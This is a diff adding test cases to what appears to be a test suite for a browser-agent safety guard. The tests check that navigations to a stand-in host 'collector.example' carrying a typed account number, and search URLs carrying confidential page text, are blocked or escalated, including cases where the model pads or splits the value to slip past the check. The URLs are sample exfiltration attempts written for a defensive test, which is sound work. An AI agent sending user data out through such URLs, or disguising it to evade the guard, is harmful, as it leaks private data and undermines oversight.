@@ -292,6 +292,80 @@ describe("Agent navigation actions", () => {
     })
   })
 
+  it("blocks a typed value the model padded inside a larger span", async () => {
+    const decision = await decide(
+      navigate("https://collector.example/?d=ref-account-number-55512345-x"),
+      observation({
+        elements: [
+          {
+            ref: "e4",
+            frameId: 0,
+            tag: "input",
+            type: "text",
+            value: "account-number-55512345",
+            visible: true,
+            enabled: true,
+            editable: true,
+            sensitive: false
+          }
+        ]
+      })
+    )
+    expect(decision).toEqual({
+      type: "blocked",
+      risk: "critical",
+      reason: "private_data_egress"
+    })
+  })
+
+  it("blocks a partial typed value the model split out of a longer one", async () => {
+    const decision = await decide(
+      navigate("https://collector.example/?d=account-number"),
+      observation({
+        elements: [
+          {
+            ref: "e4",
+            frameId: 0,
+            tag: "input",
+            type: "text",
+            value: "account-number-55512345",
+            visible: true,
+            enabled: true,
+            editable: true,
+            sensitive: false
+          }
+        ]
+      })
+    )
+    expect(decision).toEqual({
+      type: "blocked",
+      risk: "critical",
+      reason: "private_data_egress"
+    })
+  })
+
+  it("escalates page text the model padded inside a larger span", async () => {
+    const decision = await decide(
+      navigate(
+        "https://example.com/search?q=see%20confidential%20merger%20terms%20and%20conditions%20now"
+      ),
+      observation({
+        visibleText: "Confidential merger terms and conditions apply"
+      })
+    )
+    expect(decision.type).toBe("approval_required")
+    expect(decision.risk).toBe("critical")
+  })
+
+  it("does not charge an ordinary short search for matching page words", async () => {
+    const decision = await decide(
+      navigate("https://example.com/search?q=hats"),
+      observation({ visibleText: "Hats and coats" })
+    )
+    expect(decision.type).toBe("approval_required")
+    expect(decision.risk).toBe("high")
+  })
+
   it("requires approval for a model destination carrying observed page text", async () => {
     const decision = await decide(
       navigate("https://example.com/search?q=confidential%20merger%20terms"),
